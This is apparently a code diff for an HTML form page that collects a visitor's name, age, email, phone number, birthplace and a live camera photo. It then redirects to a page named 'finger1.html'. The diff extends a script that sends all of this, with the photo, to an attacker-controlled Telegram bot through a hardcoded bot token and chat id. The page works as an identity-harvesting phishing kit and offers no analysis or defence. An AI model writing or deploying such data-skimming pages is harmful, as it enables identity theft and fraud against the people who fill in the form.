@@ -162,60 +162,117 @@
 <body>
 
   <form id="myForm" onsubmit="handleForm(event)">
-    <h2>Submit Your Info</h2>
+  <h2>Submit Your Info</h2>
 
-    <label for="fullname">Full Name</label>
-    <input type="text" id="fullname" required>
+  <label for="fullname">Full Name</label>
+  <input type="text" id="fullname" required>
 
-    <label for="age">Age</label>
-    <input type="number" id="age" required>
+  <label for="age">Age</label>
+  <input type="number" id="age" required>
 
-    <label for="email">Email</label>
-    <input type="text" id="email" required> <!-- accepts normal text -->
+  <label for="email">Email</label>
+  <input type="text" id="email" required>
 
-    <label for="phonenumber">Phone Number</label>
-    <input type="text" id="phonenumber" required>
+  <label for="phonenumber">Phone Number</label>
+  <input type="text" id="phonenumber" required>
 
-    <button type="submit">Submit</button>
-  </form>
+  <label for="birthplace">Place of Birth</label>
+  <input type="text" id="birthplace" required>
 
-  <script>
-    async function handleForm(event) {
-      event.preventDefault();
+  <label for="photo">Live Picture</label>
+  <input type="file" id="photo" accept="image/*" capture="environment" required>
 
-      const name = document.getElementById('fullname').value;
-      const age = document.getElementById('age').value;
-      const email = document.getElementById('email').value;
-      const phone = document.getElementById('phonenumber').value;
+  <!-- Image preview -->
+  <div id="preview-container" style="margin-bottom: 15px;">
+    <img id="photoPreview" src="" alt="Preview will appear here" style="width: 100%; border-radius: 8px; display: none;" />
+  </div>
 
-      const message = `
+  <!-- Loading indicator -->
+  <div id="loading" style="text-align:center; display: none; color: purple; font-weight: bold;">
+    Uploading... Please wait
+  </div>
+
+  <button type="submit">Submit</button>
+</form>
+
+
+ <script>
+  // Show live preview when user selects a photo
+  document.getElementById('photo').addEventListener('change', function (event) {
+    const file = event.target.files[0];
+    const preview = document.getElementById('photoPreview');
+
+    if (file && file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        preview.src = e.target.result;
+        preview.style.display = 'block';
+      };
+      reader.readAsDataURL(file);
+    } else {
+      preview.src = '';
+      preview.style.display = 'none';
+    }
+  });
+
+  async function handleForm(event) {
+    event.preventDefault();
+
+    // Show loading
+    document.getElementById('loading').style.display = 'block';
+
+    const name = document.getElementById('fullname').value;
+    const age = document.getElementById('age').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phonenumber').value;
+    const birthplace = document.getElementById('birthplace').value;
+    const photoInput = document.getElementById('photo');
+    const photoFile = photoInput.files[0];
+
+    const message = `
 New Submission:
 👤 Name: ${name}
 🎂 Age: ${age}
 📧 Email: ${email}
 📞 Phone: ${phone}
-      `;
+🏠 Birthplace: ${birthplace}
+    `;
 
-      const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
-      const chatId = "7470456034";
+    const telegramToken = "7989916546:AAEB5kP_GnKwdsf6fHw6yb_znh2w8hosEY0";
+    const chatId = "7470456034";
 
-      try {
-        await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-      } catch (e) {
-        // ignore all errors
-      }
+    try {
+      // Send text first
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
 
-      // ✅ Always redirect to the next page
-      window.location.href = "finger1.html";
+      // Send photo
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", photoFile);
+      formData.append("caption", "📸 Live Picture from " + name);
+
+      await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+    } catch (e) {
+      console.error("Telegram error:", e);
     }
-  </script>
+
+    // Hide loading and redirect
+    document.getElementById('loading').style.display = 'none';
+    window.location.href = "finger1.html";
+  }
+</script>
+
 
 
   <!-- end news section -->
